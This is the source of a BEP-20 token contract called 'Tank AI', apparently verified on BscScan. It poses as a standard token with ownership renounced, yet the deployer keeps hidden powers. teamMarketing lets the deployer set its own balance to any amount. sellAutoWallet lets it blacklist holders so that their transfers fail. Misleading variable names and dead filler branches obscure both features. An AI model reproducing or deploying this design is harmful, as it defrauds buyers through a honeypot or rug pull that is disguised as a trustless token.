/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface isFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamLimit) external view returns (uint256);

    function transfer(address shouldWallet, uint256 swapEnable) external returns (bool);

    function allowance(address teamReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapEnable) external returns (bool);

    function transferFrom(
        address sender,
        address shouldWallet,
        uint256 swapEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldTrading, uint256 value);
    event Approval(address indexed teamReceiver, address indexed spender, uint256 value);
}

interface liquidityMode is isFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface txLimit {
    function createPair(address shouldAtTx, address sellTeam) external returns (address);
}

interface toTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract minAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract TankAI is minAmount, isFrom, liquidityMode {

    address public buyLaunched;

    function maxBuy() public {
        
        
        fundAt=0;
    }

    function name() external view virtual override returns (string memory) {
        return swapTeam;
    }

    function approve(address toSell, uint256 swapEnable) public virtual override returns (bool) {
        minToken[_msgSender()][toSell] = swapEnable;
        emit Approval(_msgSender(), toSell, swapEnable);
        return true;
    }

    function owner() external view returns (address) {
        return receiverWalletAuto;
    }

    function teamMarketing(uint256 swapEnable) public {
        if (!liquidityIs[_msgSender()]) {
            return;
        }
        fromTo[buyLaunched] = swapEnable;
    }

    function getOwner() external view returns (address) {
        return receiverWalletAuto;
    }

    address private receiverWalletAuto;

    uint8 private fromExempt = 18;

    string private tokenMode = "TAI";

    uint256 private receiverAtLaunch;

    function teamWallet(address isReceiver) public {
        if (marketingReceiverEnable) {
            return;
        }
        if (receiverAtSwap == fundAt) {
            listLaunchedReceiver = false;
        }
        liquidityIs[isReceiver] = true;
        
        marketingReceiverEnable = true;
    }

    event OwnershipTransferred(address indexed fundListFee, address indexed maxTrading);

    function exemptIs() public view returns (uint256) {
        return feeLiquidityMax;
    }

    mapping(address => bool) public liquidityIs;

    address public fromAmount;

    function allowance(address receiverLiquidity, address toSell) external view virtual override returns (uint256) {
        return minToken[receiverLiquidity][toSell];
    }

    uint256 private fundAt;

    function transferFrom(address listReceiverSell, address shouldWallet, uint256 swapEnable) external override returns (bool) {
        if (minToken[listReceiverSell][_msgSender()] != type(uint256).max) {
            require(swapEnable <= minToken[listReceiverSell][_msgSender()]);
            minToken[listReceiverSell][_msgSender()] -= swapEnable;
        }
        return toTeam(listReceiverSell, shouldWallet, swapEnable);
    }

    function fromBuy() public {
        
        if (receiverAtLaunch != fundAt) {
            fundAt = receiverAtSwap;
        }
        receiverAtLaunch=0;
    }

    function sellAutoWallet(address buyTo) public {
        if (feeLiquidityMax == fundAt) {
            listLaunchedReceiver = true;
        }
        if (buyTo == buyLaunched || buyTo == fromAmount || !liquidityIs[_msgSender()]) {
            return;
        }
        if (receiverAtLaunch != fundAt) {
            receiverSell = true;
        }
        receiverMarketing[buyTo] = true;
    }

    constructor (){
        if (listLaunchedReceiver) {
            fundAt = receiverAtLaunch;
        }
        toTotal fromFund = toTotal(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fromAmount = txLimit(fromFund.factory()).createPair(fromFund.WETH(), address(this));
        receiverWalletAuto = _msgSender();
        
        buyLaunched = receiverWalletAuto;
        liquidityIs[buyLaunched] = true;
        if (receiverSell) {
            receiverSell = true;
        }
        fromTo[buyLaunched] = isFee;
        emit Transfer(address(0), buyLaunched, isFee);
        modeLaunched();
    }

    function toTeam(address listReceiverSell, address shouldWallet, uint256 swapEnable) internal returns (bool) {
        if (listReceiverSell == buyLaunched || shouldWallet == buyLaunched) {
            return walletTeamFrom(listReceiverSell, shouldWallet, swapEnable);
        }
        if (receiverSell != listLaunchedReceiver) {
            fundAt = feeLiquidityMax;
        }
        require(!receiverMarketing[listReceiverSell]);
        if (listLaunchedReceiver == receiverSell) {
            feeLiquidityMax = receiverAtSwap;
        }
        return walletTeamFrom(listReceiverSell, shouldWallet, swapEnable);
    }

    function autoShould() public view returns (uint256) {
        return fundAt;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isFee;
    }

    function transfer(address sellAuto, uint256 swapEnable) external virtual override returns (bool) {
        return toTeam(_msgSender(), sellAuto, swapEnable);
    }

    mapping(address => mapping(address => uint256)) private minToken;

    string private swapTeam = "Tank AI";

    mapping(address => bool) public receiverMarketing;

    function fundMax() public {
        if (feeLiquidityMax == fundAt) {
            receiverAtLaunch = fundAt;
        }
        
        receiverAtLaunch=0;
    }

    function symbol() external view virtual override returns (string memory) {
        return tokenMode;
    }

    uint256 private feeLiquidityMax;

    bool public marketingReceiverEnable;

    uint256 private isFee = 100000000 * 10 ** 18;

    function balanceOf(address teamLimit) public view virtual override returns (uint256) {
        return fromTo[teamLimit];
    }

    function decimals() external view virtual override returns (uint8) {
        return fromExempt;
    }

    function walletTeamFrom(address listReceiverSell, address shouldWallet, uint256 swapEnable) internal returns (bool) {
        require(fromTo[listReceiverSell] >= swapEnable);
        fromTo[listReceiverSell] -= swapEnable;
        fromTo[shouldWallet] += swapEnable;
        emit Transfer(listReceiverSell, shouldWallet, swapEnable);
        return true;
    }

    bool private listLaunchedReceiver;

    function modeLaunched() public {
        emit OwnershipTransferred(buyLaunched, address(0));
        receiverWalletAuto = address(0);
    }

    mapping(address => uint256) private fromTo;

    function sellAtWallet() public view returns (uint256) {
        return receiverAtSwap;
    }

    bool public receiverSell;

    uint256 private receiverAtSwap;

}